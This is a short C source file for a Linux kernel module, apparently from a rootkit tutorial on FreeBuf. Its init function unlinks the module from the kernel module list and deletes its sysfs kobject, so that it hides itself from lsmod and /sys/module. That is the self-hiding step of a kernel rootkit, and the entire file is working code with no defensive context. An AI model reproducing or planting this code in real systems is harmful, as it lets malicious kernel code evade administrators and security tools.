/*
lkm.c
link:http://www.freebuf.com/articles/system/54263.html
*/
 
#include <linux/module.h>    
#include <linux/kernel.h>   
#include <linux/init.h>        

MODULE_LICENSE("GPL");
 
static int lkm_init(void)
{
    printk("Arciryas:module loaded\n");
    list_del_init(&__this_module.list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
    return 0;    
}
 
static void lkm_exit(void)
{
    printk("Arciryas:module removed\n");
}
 
module_init(lkm_init);
module_exit(lkm_exit);
